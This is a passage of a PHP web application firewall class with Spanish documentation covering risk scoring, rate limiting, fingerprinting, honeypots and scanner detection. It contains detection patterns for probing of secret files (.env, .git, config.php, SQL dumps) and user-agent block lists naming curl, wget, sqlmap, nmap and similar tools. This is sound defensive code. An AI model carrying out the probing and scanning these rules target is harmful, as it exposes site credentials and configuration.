     * AWS
     * DigitalOcean
     * GoogleCloud
     *
     * Rendimiento estimado:
     *
     * - Detección por rangos: ~0.5 ms
     * - Reverse DNS (solo en casos sospechosos): 40–200 ms
     *
     * Seguridad:
     *
     * Este mecanismo permite detectar ataques provenientes de:
     *
     * - Botnets alojadas en cloud
     * - herramientas de pentesting automatizadas
     * - scanners masivos de vulnerabilidades
     *
     * No bloquea automáticamente tráfico cloud, solo incrementa
     * el perfil de riesgo del visitante.
     */
    protected function detectCloudAttack(): void
    {
        // 1. PRIMERA CAPA: detección por rangos IP (más rápida y precisa)
        $ipBinary = @inet_pton($this->ip);

        if ($ipBinary !== false) {
            $provider = Capsule::table('waf_cloud_ranges_szm')
                ->where('ip_start', '<=', $ipBinary)
                ->where('ip_end', '>=', $ipBinary)
                ->value('provider');

            if ($provider) {
                $this->addRiskScore($this->ip, 7, "cloud_infrastructure_origin: $provider");
                return; // Si coincide, no necesitamos más análisis
            }
        }

        // 2. SEGUNDA CAPA: solo analizar DNS si ya existe sospecha
        $risk = Capsule::table('waf_blocked_ips_szm')
            ->where('ip_address', $this->ip)
            ->value('risk_score');

        if ($risk < 5) {
            return;
        }

        // 3. TERCERA CAPA: reverse DNS como fallback
        $host = strtolower(@gethostbyaddr($this->ip));

        if (!$host || $host === $this->ip) {
            return;
        }

        $providers = [
            "amazonaws",
            "digitalocean",
            "linode",
            "vultr",
            "googlecloud",
            "azure",
            "hetzner",
            "ovh"
        ];

        foreach ($providers as $p) {
            if (str_contains($host, $p)) {
                $this->addRiskScore($this->ip, 5, "cloud_infrastructure_origin_dns: $p");
                return;
            }
        }
    }

    /**
     * Detecta ataques de fuzzing basados en la frecuencia de activación
     * de reglas de seguridad en un corto intervalo de tiempo.
     *
     * El fuzzing es una técnica utilizada por atacantes y herramientas
     * de seguridad ofensiva para enviar múltiples cargas maliciosas
     * con variaciones automáticas con el objetivo de descubrir
     * vulnerabilidades en la aplicación.
     *
     * Este método analiza el historial reciente de alertas registradas
     * en la tabla `waf_attack_logs_szm` para determinar si un cliente
     * está generando una cantidad anormalmente alta de eventos de
     * seguridad en un período corto.
     *
     * Estrategia de detección:
     *
     * 1. Se consulta la tabla `waf_attack_logs_szm` buscando registros
     *    asociados con la identidad del cliente.
     *
     * 2. La identidad se determina mediante:
     *
     *        - Dirección IP
     *        - Fingerprint del cliente
     *
     *    Esto permite detectar atacantes incluso si cambian de IP
     *    utilizando VPN, proxies rotativos o redes TOR.
     *
     * 3. Se cuentan los eventos de seguridad generados durante los
     *    últimos 2 minutos.
     *
     * 4. Si se detectan más de 10 alertas en ese intervalo,
     *    se considera un patrón de fuzzing activo.
     *
     * Acción tomada:
     *
     *    - Se agregan +10 puntos al Risk Score del cliente.
     *    - Se registra un evento adicional en los logs indicando
     *      comportamiento de fuzzing.
     *
     * Este puntaje elevado acelera el bloqueo automático del atacante
     * dentro del sistema de scoring del WAF.
     *
     * Ejemplos de herramientas que suelen generar este comportamiento:
     *
     *      - payload fuzzers
     *      - scanners de vulnerabilidades
     *      - herramientas de pentesting automatizado
     *
     * Características del ataque detectado:
     *
     *      - múltiples payloads maliciosos
     *      - activación repetida de reglas de seguridad
     *      - alta frecuencia de solicitudes con variaciones
     *
     * Tablas utilizadas:
     *
     *      waf_attack_logs_szm  -> historial de eventos de seguridad
     *
     * Método relacionado:
     *
     *      addRiskScore()
     *
     * @return void
     */
    protected function detectFuzzing(): void
    {
        // Buscamos en los logs de ataques si esta "identidad" (IP o FP)
        // ha activado reglas de seguridad recientemente.
        $count = Capsule::table('waf_attack_logs_szm')
            ->where(function ($query) {
                $query->where('ip_address', $this->ip)
                    ->orWhere('fingerprint', $this->fingerprint);
            })
            ->where('created_at', '>=', date('Y-m-d H:i:s', strtotime('-2 minutes')))
            ->count();

        // Si ha activado 10 o más alertas en 2 minutos...
        if ($count > 10) {
            // Sumamos 10 puntos (casi baneo total)
            $this->addRiskScore($this->ip, 10, "intense_payload_fuzzing");

            // Registramos el evento de comportamiento
            Capsule::table('waf_attack_logs_szm')->insert([
                'ip_address' => $this->ip,
                'fingerprint' => $this->fingerprint,
                'type' => 'BEHAVIOR_DETECTION',
                'field' => 'fuzzing_count',
                'value' => "Detected $count suspicious payloads in 2 min",
                'uri' => $this->uri,
                'user_agent' => $this->ua,
                'created_at' => date('Y-m-d H:i:s')
            ]);
        }
    }

    /**
     * Detecta patrones de navegación sospechosos que pueden indicar
     * escaneo automatizado de endpoints sensibles.
     *
     * Este método analiza el historial reciente de solicitudes realizadas
     * por una misma dirección IP para identificar comportamientos típicos
     * de herramientas de enumeración o scanners de vulnerabilidades.
     *
     * Flujo de análisis:
     *
     * 1. Se recupera el historial de las últimas 10 solicitudes realizadas
     *    por la IP en un intervalo de 20 segundos desde la tabla
     *    `waf_requests_szm`.
     *
     * 2. Se analiza cada URI buscando coincidencias con patrones asociados
     *    a recursos sensibles o configuraciones críticas del servidor.
     *
     *    Ejemplos de recursos que suelen ser buscados por atacantes:
     *
     *        .env           -> variables de entorno
     *        config         -> archivos de configuración
     *        backup         -> copias de seguridad expuestas
     *        .sql           -> dumps de bases de datos
     *        phpmyadmin     -> panel de administración de MySQL
     *        wp-admin       -> panel administrativo de WordPress
     *        adminer        -> gestor de bases de datos
     *        v1/auth        -> endpoints de autenticación de APIs
     *        monitoring     -> paneles de monitoreo o métricas
     *
     * 3. Si se detectan tres o más coincidencias dentro de la ventana
     *    analizada, se considera que el cliente está realizando un
     *    escaneo secuencial de endpoints sensibles.
     *
     * 4. En ese caso:
     *
     *      - Se incrementa el puntaje de riesgo mediante addRiskScore()
     *        para contribuir al sistema de bloqueo basado en scoring.
     *
     *      - Se registra un evento detallado en la tabla
     *        `waf_attack_logs_szm` para análisis forense posterior.
     *
     * Evidencia registrada:
     *
     *      hits      -> número de coincidencias detectadas
     *      history   -> historial completo de URIs analizadas
     *      matches   -> URIs que activaron el patrón sospechoso
     *
     * Este registro permite analizar posteriormente:
     *
     *      - qué endpoints fueron probados
     *      - el orden del escaneo
     *      - posibles herramientas utilizadas
     *
     * Estrategia de seguridad:
     *
     *    Este método detecta comportamientos típicos de herramientas
     *    de enumeración y fuzzing como:
     *
     *        - directory scanners
     *        - vulnerability scanners
     *        - scripts de reconocimiento
     *
     *    En lugar de bloquear inmediatamente, se suma al modelo de
     *    "Risk Scoring", permitiendo correlacionar múltiples señales
     *    sospechosas antes de aplicar un baneo definitivo.
     *
     * Tablas utilizadas:
     *
     *      waf_requests_szm     -> historial de solicitudes
     *      waf_attack_logs_szm  -> registro de eventos de seguridad
     *
     * Métodos relacionados:
     *
     *      addRiskScore()
     *
     * @return void
     */
    protected function detectSuspiciousNavigation(): void
    {
        // 1. Obtenemos el historial de las últimas 10 peticiones en 20 segundos
        $lastRequests = Capsule::table('waf_requests_szm')
            ->where('ip_address', $this->ip)
            ->where('created_at', '>=', date('Y-m-d H:i:s', strtotime('-20 seconds')))
            ->orderByDesc('created_at')
            ->limit(10)
            ->pluck('uri')
            ->toArray();

        $suspiciousCount = 0;
        $foundPatterns = [];

        // 2. Patrones críticos que un usuario normal nunca tocaría en ráfaga
        $pattern = '/(\.env|config|backup|\.sql|phpmyadmin|wp-admin|adminer|v1\/auth|monitoring)/i';

        foreach ($lastRequests as $uri) {
            if (preg_match($pattern, $uri)) {
                $suspiciousCount++;
                $foundPatterns[] = $uri; // Guardamos qué patrón activó la alerta
            }
        }

        // 3. Si detectamos 3 o más intentos sospechosos en el historial reciente
        if ($suspiciousCount >= 3) {

            // Sumamos riesgo al perfil (IP + Fingerprint)
            $this->addRiskScore($this->ip, 8, "sequential_suspicious_navigation");

            // REGISTRO DETALLADO (Evidencia Forense)
            Capsule::table('waf_attack_logs_szm')->insert([
                'ip_address' => $this->ip,
                'fingerprint' => $this->fingerprint,
                'type' => 'NAVIGATION_SCAN',
                'field' => 'request_sequence',
                // Guardamos el historial completo como JSON para analizarlo después
                'value' => json_encode([
                    'hits' => $suspiciousCount,
                    'history' => $lastRequests,
                    'matches' => array_unique($foundPatterns)
                ]),
                'uri' => $_SERVER['REQUEST_URI'] ?? '',
                'user_agent' => $this->ua,
                'created_at' => date('Y-m-d H:i:s')
            ]);
        }
    }

    /**
     * Detecta comportamiento de navegación no humano basado en la velocidad
     * de las solicitudes HTTP realizadas por una misma dirección IP.
     *
     * Este método analiza la frecuencia de peticiones recientes registradas
     * en la tabla de monitoreo del WAF (`waf_requests_szm`). Su objetivo es
     * identificar patrones típicos de automatización como:
     *
     *    - bots de scraping
     *    - scanners de vulnerabilidades
     *    - herramientas de fuzzing
     *    - scripts automatizados
     *
     * Estrategia de detección:
     *
     * 1. Se consulta la tabla `waf_requests_szm` para contar cuántas
     *    solicitudes ha realizado la misma IP en los últimos 5 segundos.
     *
     * 2. Si el número de solicitudes supera el umbral definido (15),
     *    se considera que el comportamiento es demasiado rápido para
     *    un usuario humano navegando normalmente.
     *
     * 3. En ese caso se incrementa el puntaje de riesgo mediante
     *    `addRiskScore()`, lo que contribuye al sistema de scoring
     *    acumulativo del WAF.
     *
     * Umbral actual:
     *
     *      > 15 requests en 5 segundos
     *
     * Esto equivale aproximadamente a:
     *
     *      3+ requests por segundo
     *
     * Lo cual suele indicar:
     *
     *    - crawling agresivo
     *    - scraping automatizado
     *    - escaneo de endpoints
     *    - herramientas de enumeración
     *
     * Acción tomada:
     *
     *    - Se agregan +6 puntos al Risk Score del cliente.
     *    - Se registra un evento en el log del sistema para
     *      facilitar auditoría o análisis forense.
     *
     * Nota de seguridad:
     *
     *    Este método no bloquea inmediatamente al cliente.
     *    En su lugar, utiliza un modelo de "risk scoring"
     *    para evitar falsos positivos y permitir que múltiples
     *    señales sospechosas desencadenen el bloqueo automático.
     *
     * Tabla utilizada:
     *
     *      waf_requests_szm
     *
     * Campos relevantes:
     *
     *      ip_address   -> Dirección IP del cliente
     *      created_at   -> Timestamp de cada solicitud
     *
     * Método relacionado:
     *
     *      addRiskScore()
     *
     * @return void
     */
    protected function detectNonHumanBehavior(): void
    {
        // Usamos la tabla de requests que ya tenemos para el rateLimit
        $count = Capsule::table('waf_requests_szm')
            ->where('ip_address', $this->ip)
            ->where('created_at', '>=', date('Y-m-d H:i:s', strtotime('-5 seconds')))
            ->count();

        if ($count > 15) {
            $this->addRiskScore($this->ip, 6, "rapid_navigation_behavior");

            // Opcional: Loguear el comportamiento sospechoso
            error_log("[WAF] Comportamiento no humano detectado para IP: {$this->ip}");
        }
    }

    /**
     * Analiza la reputación del cliente basándose en la integridad de los
     * encabezados HTTP y en la identificación del User-Agent.
     *
     * Este método forma parte del módulo de análisis de comportamiento del WAF.
     * Su objetivo es detectar clientes automatizados, scrapers o herramientas
     * de programación que intentan interactuar con la aplicación sin utilizar
     * un navegador real.
     *
     * El análisis se divide en tres etapas principales:
     *
     * 1. Verificación de integridad de navegador
     *    Se comprueba la presencia de encabezados típicos enviados por
     *    navegadores reales:
     *
     *        - HTTP_ACCEPT
     *        - HTTP_ACCEPT_LANGUAGE
     *        - HTTP_ACCEPT_ENCODING
     *
     *    Si faltan dos o más de estos encabezados, se considera que el cliente
     *    probablemente no es un navegador real (scripts HTTP simples, bots
     *    programáticos o herramientas de automatización).
     *
     *    En ese caso se incrementa el puntaje de riesgo en +5.
     *
     * 2. Identificación de bots de alto riesgo
     *    Se analiza el encabezado User-Agent buscando firmas asociadas
     *    a herramientas de programación y scraping agresivo.
     *
     *    Ejemplos:
     *        curl
     *        python
     *        httpclient
     *        scrapy
     *        wget
     *        go-http-client
     *
     *    Estas herramientas suelen utilizarse para:
     *
     *        - scraping masivo
     *        - explotación automatizada
     *        - pruebas de penetración
     *        - ataques de fuerza bruta
     *
     *    Si se detecta alguna de estas firmas, se agregan +8 puntos de riesgo
     *    y se detiene el análisis inmediatamente.
     *
     * 3. Identificación de bots de IA
     *    Se detectan crawlers utilizados por modelos de inteligencia artificial
     *    para recopilar datos de entrenamiento o indexación.
     *
     *    Ejemplos:
     *        GPTBot
     *        ChatGPT-User
     *        ClaudeBot
     *        PerplexityBot
     *        Google-Extended
     *
     *    Estos bots no son necesariamente maliciosos, pero pueden generar
     *    carga significativa en el servidor o realizar scraping de contenido.
     *
     *    Si se detectan, se agregan +7 puntos de riesgo.
     *
     * 4. Identificación de scrapers SEO
     *    Se detectan bots de plataformas de análisis SEO que realizan
     *    crawling intensivo de sitios web.
     *
     *    Ejemplos:
     *        Ahrefs
     *        Semrush
     *        MJ12Bot
     *        DotBot
     *        BLEXBot
     *
     *    Aunque son bots legítimos, pueden consumir recursos del servidor
     *    y realizar exploraciones agresivas.
     *
     *    Si se detectan, se agregan +6 puntos de riesgo.
     *
     * Estrategia de seguridad:
     *
     *    - El sistema no bloquea inmediatamente al cliente.
     *    - En su lugar incrementa un "Risk Score".
     *    - Si múltiples comportamientos sospechosos se acumulan,
     *      el sistema ejecutará un baneo automático.
     *
     * Esto permite reducir falsos positivos y detectar ataques
     * progresivos o automatizados.
     *
     * Método relacionado:
     *      addRiskScore()
     *
     * @return void
     */
    protected function analyzeClientReputation(): void
    {
        // 1. Verificación de Integridad (Fake Browser)
        $required = ['HTTP_ACCEPT', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_ACCEPT_ENCODING'];
        $missingCount = 0;
        foreach ($required as $header) {
            if (!isset($_SERVER[$header])) $missingCount++;
        }

        if ($missingCount >= 2) {
            $this->addRiskScore($this->ip, 5, "missing_browser_headers");
        }

        // 2. Verificación de Identidad (Bots y Scrapers)
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

        // Categoría: Alta Sospecha (Bots de programación)
        $highRisk = ["curl", "python", "httpclient", "scrapy", "wget", "go-http-client"];
        foreach ($highRisk as $bot) {
            if (str_contains($ua, $bot)) {
                $this->addRiskScore($this->ip, 8, "high_risk_bot: $bot");
                return;
            }
        }
        $aiBots = ["gptbot", "chatgpt-user", "claudebot", "perplexitybot", "google-extended"];
        foreach ($aiBots as $bot) {
            if (str_contains($ua, $bot)) {
                $this->addRiskScore($this->ip, 7, "ai_scraper: $bot");
                return;
            }
        }

        // Categoría: Baja Sospecha (Scrapers SEO)
        $scrapers = ["ahrefs", "semrush", "mj12bot", "dotbot", "blexbot"];
        foreach ($scrapers as $bot) {
            if (str_contains($ua, $bot)) {
                $this->addRiskScore($this->ip, 6, "seo_scraper: $bot");
                return;
            }
        }
    }

    /**
     * Incrementa el puntaje de riesgo (Risk Score) de una IP o huella digital
     * y ejecuta un baneo automático cuando se supera el umbral definido.
     *
     * Este método forma parte del sistema de correlación de eventos del WAF.
     * Cada vez que se detecta una actividad sospechosa (XSS, SQLi, scanning,
     * abuso de rate limit, honeypot, etc.), se agregan puntos al perfil
     * de riesgo del visitante.
     *
     * El sistema utiliza dos identificadores para rastrear atacantes:
     *
     *  - IP Address
     *  - Fingerprint del cliente (generado previamente en el constructor)
     *
     * Esto permite detectar atacantes incluso si cambian de IP
     * (VPN, TOR, proxies rotativos).
     *
     * Flujo de funcionamiento:
     *
     * 1. Se busca un registro existente en la base de datos utilizando:
     *      - la IP actual
     *      - o el fingerprint del cliente
     *
     * 2. Si no existe un registro:
     *      Se crea un nuevo perfil de riesgo con el puntaje inicial.
     *
     * 3. Si el registro ya existe:
     *      - Se acumulan los nuevos puntos al risk_score existente
     *      - Se registra el motivo del evento de seguridad
     *      - Se actualiza la IP por si el atacante cambió de dirección
     *
     * 4. Si el puntaje total alcanza o supera el umbral (20 puntos):
     *      - Se marca la IP como baneada
     *      - Se establece un bloqueo temporal de 24 horas
     *      - Se registra el evento en el sistema de auditoría (logBan)
     *
     * 5. Si el visitante ya está baneado o acaba de ser baneado:
     *      Se interrumpe inmediatamente la ejecución de PHP mostrando
     *      la página de bloqueo mediante renderBlockedPage().
     *
     * Ventajas del sistema:
     *
     *  - Permite correlacionar múltiples eventos sospechosos
     *  - Evita bloqueos inmediatos por falsos positivos
     *  - Detecta atacantes que rotan direcciones IP
     *  - Mantiene trazabilidad completa para auditoría
     *
     * Tabla utilizada:
     *      waf_blocked_ips_szm
     *
     * Campos relevantes:
     *      ip_address     -> Dirección IP del visitante
     *      fingerprint    -> Huella digital del cliente
     *      risk_score     -> Puntaje acumulado de riesgo
     *      is_banned      -> Indicador de bloqueo
     *      ban_until      -> Fecha de expiración del bloqueo
     *      last_attempt   -> Última actividad sospechosa
     *
     * @param string $ip Dirección IP del cliente.
     * @param int $points Cantidad de puntos de riesgo a agregar.
     * @param string $reason Motivo del incremento del puntaje (ej. XSS_ATTEMPT, SQLI_PATTERN).
     *
     * @return void
     */
    protected function addRiskScore(string $ip, int $points, string $reason): void
    {
        $fp = $this->fingerprint; // La huella digital generada en el constructor

        // 1. Buscamos si ya existe un registro previo por IP o por Fingerprint
        $record = Capsule::table('waf_blocked_ips_szm')
            ->where('ip_address', $ip)
            ->orWhere('fingerprint', $fp)
            ->first();

        $now = date('Y-m-d H:i:s');

        if (!$record) {
            // 2. Si es la primera vez que lo vemos, creamos el perfil de riesgo
            Capsule::table('waf_blocked_ips_szm')->insert([
                'ip_address' => $ip,
                'fingerprint' => $fp,
                'risk_score' => $points,
                'is_banned' => 0,
                'reason' => $reason,
                'last_attempt' => $now,
                'created_at' => $now
            ]);
            $currentScore = $points;
        } else {
            // 3. Si ya existe, acumulamos los puntos y actualizamos el rastro
            $currentScore = $record->risk_score + $points;

            $updateData = [
                'risk_score' => $currentScore,
                'reason' => $record->reason . " | " . $reason,
                'last_attempt' => $now,
                'ip_address' => $ip // Actualizamos la IP por si cambió pero el FP es el mismo
            ];

            // 4. Lógica de Baneo Automático (Umbral de 20 puntos)
            if ($currentScore >= 20 && $record->is_banned == 0) {
                $updateData['is_banned'] = 1;
                $updateData['ban_until'] = date('Y-m-d H:i:s', strtotime('+24 hours'));

                // Log de baneo definitivo para auditoría
                $this->logBan($ip, $fp, $currentScore, $updateData['reason']);
            }

            Capsule::table('waf_blocked_ips_szm')
                ->where('id', $record->id)
                ->update($updateData);
        }

        // 5. Si el baneo acaba de ocurrir, cortamos la ejecución de PHP de inmediato
        if ($currentScore >= 20) {
            $this->renderBlockedPage($ip, $record->ban_until, $record->city, $record->country);
        }
    }

    /**
     * Detecta accesos a honeypots y firmas de herramientas de hacking.
     *
     * Esta función busca patrones asociados a herramientas de escaneo,
     * pentesting o automatización maliciosa. Si detecta alguno de estos
     * indicadores, bloquea inmediatamente la IP del cliente.
     *
     * Estrategia de detección:
     *
     * 1. Honeypots en la URL
     *    Se revisa si la URI solicitada contiene rutas típicamente utilizadas
     *    por atacantes para descubrir configuraciones sensibles o paneles de
     *    administración ocultos.
     *
     *    Ejemplos:
     *        /.env
     *        /.git
     *        /config.php
     *        /phpmyadmin
     *        /adminer
     *
     *    Un usuario legítimo normalmente nunca solicita estas rutas de forma
     *    directa, por lo que se consideran indicadores claros de escaneo.
     *
     * 2. Firmas de herramientas de hacking en User-Agent
     *    Se revisa si el encabezado User-Agent contiene identificadores
     *    conocidos de herramientas de seguridad ofensiva o automatización.
     *
     *    Ejemplos:
     *        sqlmap
     *        nmap
     *        burp
     *        zap
     *        nikto
     *        gobuster
     *        masscan
     *
     *    Estas herramientas suelen identificarse explícitamente en el
     *    User-Agent durante escaneos automáticos.
     *
     * 3. Detección de cabeceras de interceptores HTTP
     *    Algunas herramientas de análisis de tráfico o proxies de pentesting
     *    agregan cabeceras específicas durante las pruebas.
     *
     *    Ejemplos:
     *        HTTP_X_BURP_TEST
     *        HTTP_X_SCANNER
     *        HTTP_X_REQUEST_ID
     *
     *    Si estas cabeceras aparecen en la petición, se considera evidencia
     *    de manipulación o inspección activa del tráfico.
     *
     * Acción tomada:
     *
     *    Si cualquiera de las condiciones anteriores se cumple, se ejecuta
     *    `block()` con baneo inmediato (`immediateBan = true`), lo que:
     *
     *        • registra el intento en los logs del WAF
     *        • incrementa el risk score
     *        • bloquea la IP automáticamente
     *
     * Nota de seguridad:
     *
     *    Este tipo de detección es muy efectivo contra:
     *
     *        - escaneos automatizados
     *        - bots de reconocimiento
     *        - herramientas de pentesting
     *        - scrapers agresivos
     *
     * @return void
     */
    protected function checkHoneypots(): void
    {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        $uri = strtolower($this->uri);

        foreach ($this->botTraps as $trap) {
            // 1. Buscamos la firma en la URL
            if (str_contains($uri, $trap)) {
                $this->block("HONEYPOT_HIT: $trap", "URL", $this->uri, $this->ip, true);
            }

            // 2. Buscamos la firma en el User-Agent (Herramientas)
            if (str_contains($ua, $trap)) {
                $this->block("HACK_TOOL_DETECTED: $trap", "User-Agent", $ua, $this->ip, true);
            }
        }

        // 3. Detección de Cabeceras de Proxy/Interceptor (Burp/ZAP)
        $suspiciousHeaders = ['HTTP_X_BURP_TEST', 'HTTP_X_SCANNER', 'HTTP_X_REQUEST_ID'];
        foreach ($suspiciousHeaders as $header) {
            if (isset($_SERVER[$header])) {
                $this->block("INTERCEPTOR_HEADER", $header, "Detected proxy-specific header", $this->ip, true);
            }
        }
    }

    /**
     * Verifica si el fingerprint del cliente está bloqueado por el WAF.
     *
     * A diferencia del bloqueo tradicional por dirección IP, este método
     * permite bloquear clientes basándose en su huella digital (fingerprint),
     * lo que ayuda a detectar atacantes que intentan evadir bloqueos cambiando
     * de IP pero utilizando el mismo navegador o entorno de conexión.
     *
     * Flujo de ejecución:
     *
     * 1. Obtiene el fingerprint previamente generado del cliente.
     *
     * 2. Si no existe fingerprint, la función termina inmediatamente
     *    ya que no hay forma de correlacionar al cliente.
     *
     * 3. Consulta la tabla `waf_blocked_ips_szm` buscando registros que:
     *      - coincidan con el fingerprint
     *      - estén marcados como bloqueados (`is_banned = 1`)
     *      - tengan un bloqueo activo:
     *          • `ban_until` mayor a la fecha actual
     *          • o `ban_until` NULL (bloqueo permanente)
     *
     * 4. Si se encuentra un registro activo:
     *      - se registra el evento en el log del sistema
     *      - se devuelve un código HTTP 403 (Forbidden)
     *      - se termina la ejecución del script
     *
     * Este mecanismo permite detectar evasiones comunes donde el atacante:
     *
     *      - rota IPs (VPN, proxies, botnets)
     *      - mantiene el mismo User-Agent
     *      - usa el mismo entorno de navegador
     *
     * En esos casos el fingerprint se mantiene estable y el bloqueo sigue siendo efectivo.
     *
     * Ejemplo de fingerprint:
     *
     *      8c7a4e5c1c8d4c8e7f0b9f6e5e1c...
     *
     * Nota:
     * El fingerprint no es completamente infalible ya que las cabeceras HTTP
     * pueden ser manipuladas, pero añade una capa adicional de correlación
     * muy útil para detectar automatización o ataques persistentes.
     *
     * @return void
     */
    protected function checkFingerprintBan(): void
    {
        $fp = $this->fingerprint;
        if (!$fp) return;
        $record = Capsule::table('waf_blocked_ips_szm')
            ->where('fingerprint', $fp)
            ->where('is_banned', 1)
            ->where(function ($query) {
                $query->where('ban_until', '>', date('Y-m-d H:i:s'))
                    ->orWhereNull('ban_until'); // Por si hay baneos permanentes
            })
            ->first();
        if ($record) {
            //$this->renderBlockedPage($this->ip, $record->ban_until, $record->city, $record->country);
            error_log("[WAF] Acceso denegado por Fingerprint: $fp");
            http_response_code(403);
            exit("Acceso denegado por políticas de seguridad. [ Fingerprint ]");
        }
    }

    /**
     * Genera un fingerprint (huella digital) del cliente basado en cabeceras HTTP.
     *
     * Este fingerprint permite identificar de forma más consistente a un cliente
     * incluso si cambia de dirección IP, utilizando características del navegador
     * o del entorno de conexión.
     *
     * La huella se construye combinando varias cabeceras HTTP comunes:
     *
     *  - HTTP_USER_AGENT      → identifica navegador, sistema operativo o bot
     *  - HTTP_ACCEPT_LANGUAGE → idioma preferido del cliente
     *  - HTTP_ACCEPT_ENCODING → algoritmos de compresión soportados
     *  - SSL_PROTOCOL         → protocolo TLS utilizado (si la conexión es HTTPS)
     *
     * Estos valores se concatenan y se transforman en un hash SHA-256 para
     * producir un identificador compacto y difícil de manipular directamente.
     *
     * Usos dentro del WAF:
     *
     *  - detectar evasión de bloqueos por cambio de IP
     *  - correlacionar actividad sospechosa entre múltiples requests
     *  - aplicar rate limit por cliente real y no solo por IP
     *  - mejorar la identificación de bots automatizados
     *
     * Ejemplo de datos base:
     *
     *      Mozilla/5.0 (Windows NT 10.0; Win64; x64)
     *      es-MX,es;q=0.9,en;q=0.8
     *      gzip, deflate, br
     *      TLSv1.3
     *
     * Resultado:
     *
     *      8c7a4e5c1c8d4c8e7f0b9f6e5e1c...
     *
     * Nota de seguridad:
     * Este fingerprint no es único ni infalible, ya que las cabeceras HTTP
     * pueden ser falsificadas por atacantes. Sin embargo, proporciona una
     * señal útil para correlacionar tráfico sospechoso.
     *
     * @return string
     *      Hash SHA-256 que representa la huella digital del cliente.
     */
    protected function generateFingerprint(): string
    {
        $data = [
            $_SERVER['HTTP_USER_AGENT'] ?? '',
            $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
            $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
            // Si usas HTTPS, esto ayuda a identificar la suite de cifrado
            $_SERVER['SSL_PROTOCOL'] ?? '',
        ];
        return hash('sha256', implode('|', $data));
    }

    /**
     * Aplica control de Rate Limiting por dirección IP.
     *
     * Esta función limita la cantidad de solicitudes que una IP puede realizar
     * en un período de 60 segundos para prevenir:
     *
     *  - ataques de fuerza bruta
     *  - scraping agresivo
     *  - bots automatizados
     *  - ataques de denegación de servicio (DoS de baja intensidad)
     *
     * Arquitectura del sistema:
     *
     * 1. Redis (Alta performance)
     *    - Se utiliza como mecanismo principal de conteo.
     *    - Incremento atómico mediante `INCR`.
     *    - Si es la primera solicitud, se asigna un TTL de 60 segundos.
     *    - Esto permite mantener una ventana deslizante de un minuto.
     *
     *    Ventajas:
     *      • O(1) operaciones
     *      • sin escritura en disco
     *      • altamente escalable
     *
     * 2. Fallback a MySQL
     *    - Si Redis no está disponible o falla, se utiliza una
     *      implementación basada en base de datos.
     *    - Cada solicitud se registra en `waf_requests_szm`.
     *    - Se cuenta el número de solicitudes de la IP en el último minuto.
     *
     * 3. Limpieza probabilística
     *    - Con una probabilidad del 5%, se eliminan registros
     *      antiguos (>5 minutos) para evitar crecimiento excesivo
     *      de la tabla.
     *
     * Límite actual:
     *
     *      60 requests por minuto por IP
     *
     * Si se supera el límite:
     *
     *      Se ejecuta `block()` para bloquear la IP inmediatamente.
     *
     * Ejemplo de clave Redis:
     *
     *      waf:rate:192.168.1.100
     *
     * Ejemplo de flujo Redis:
     *
     *      INCR waf:rate:ip
     *      → 1 → expire 60
     *      → 2
     *      → 3
     *      ...
     *      → 61 → block
     *
     * @return void
     */
    protected function rateLimit(): void
    {
        // 1. INTENTO CON REDIS (Alta Performance)
        if ($this->redis) {
            try {
                $key = "waf:rate:{$this->ip}";

                // Incrementamos de forma atómica
                $count = $this->redis->incr($key);

                // Si es el primer hit (count == 1), le damos 60 segundos de vida
                if ($count === 1) {
                    $this->redis->expire($key, 60);
                }

                if ($count > 60) {
                    $this->block("rate_limit_redis", "requests_per_minute", $count, $this->ip, true);
                }

                // IMPORTANTE: Si usamos Redis, NO necesitamos insertar en MySQL
                // para el rate limit, ahorrando muchísima carga de disco.
                return;
            } catch (\Exception $e) {
                // Si Redis falla por alguna razón, dejamos que siga al código de abajo (MySQL)
                error_log("WAF Redis Error: " . $e->getMessage());
            }
        }

        // 2. FALLBACK A MYSQL (Tu lógica original)
        // Limpieza aleatoria (5% de probabilidad)
        if (rand(1, 100) <= 5) {
            Capsule::table('waf_requests_szm')
                ->where('created_at', '<', date('Y-m-d H:i:s', strtotime('-5 minutes')))
                ->delete();
        }
        Capsule::table('waf_requests_szm')->insert([
            'ip_address' => $this->ip,
            'uri' => $this->uri,
            'created_at' => date('Y-m-d H:i:s')
        ]);

        $count = Capsule::table('waf_requests_szm')
            ->where('ip_address', $this->ip)
            ->where('created_at', '>=', date('Y-m-d H:i:s', strtotime('-1 minute')))
            ->count();
        if ($count > 60) {
            $this->block("rate_limit", "requests_per_minute", $count, $this->ip, true);
        }
    }

    /**
     * Verifica si la IP actual se encuentra bloqueada por el WAF.
     *
     * Esta función utiliza una estrategia de doble almacenamiento:
     *   1. Redis (cache rápida)
     *   2. MySQL (fuente de verdad)
     *
     * Flujo de ejecución:
     *
     * 1. Consulta en Redis
     *    - Se genera una clave de cache con el formato:
     *          waf:ban:{ip}
     *    - Si existe, significa que la IP sigue bloqueada.
     *    - Se recuperan los datos del bloqueo y se muestra la página
     *      de acceso bloqueado sin consultar la base de datos.
     *
     * 2. Consulta en MySQL (si Redis no tiene la información)
     *    - Busca en la tabla `waf_blocked_ips_szm` si la IP está marcada
     *      como bloqueada (`is_banned = 1`).
     *
     * 3. Si la IP está bloqueada:
     *      - Se verifica si el tiempo de bloqueo (`ban_until`) aún no expira.
     *
     *      a) Si el bloqueo sigue activo:
     *          - Se calcula el TTL restante.
     *          - Se guarda el bloqueo en Redis con ese TTL para acelerar
     *            futuras verificaciones.
     *          - Se renderiza la página de bloqueo mediante `renderBlockedPage()`.
     *
     *      b) Si el bloqueo ya expiró:
     *          - Se elimina cualquier posible cache residual en Redis.
     *          - Se actualiza la base de datos para:
     *                • desactivar el bloqueo
     *                • reiniciar contador de intentos
     *                • registrar motivo del desbloqueo
     *
     * Este mecanismo mejora significativamente el rendimiento del WAF,
     * evitando consultas constantes a la base de datos para IPs bloqueadas.
     *
     * Beneficios de esta arquitectura:
     *
     *  - Redis maneja verificaciones rápidas de IP bloqueadas
     *  - MySQL mantiene el estado persistente del sistema
     *  - TTL automático sincronizado con la duración del baneo
     *  - Limpieza automática de bloqueos expirados
     *
     * @return void
     */
    protected function checkIpStatus(): void
    {
        $cacheKey = "waf:ban:{$this->ip}";

        // 1. Intentar leer desde Redis
        if ($this->redis && $this->redis->exists($cacheKey)) {
            $data = json_decode($this->redis->get($cacheKey), true);
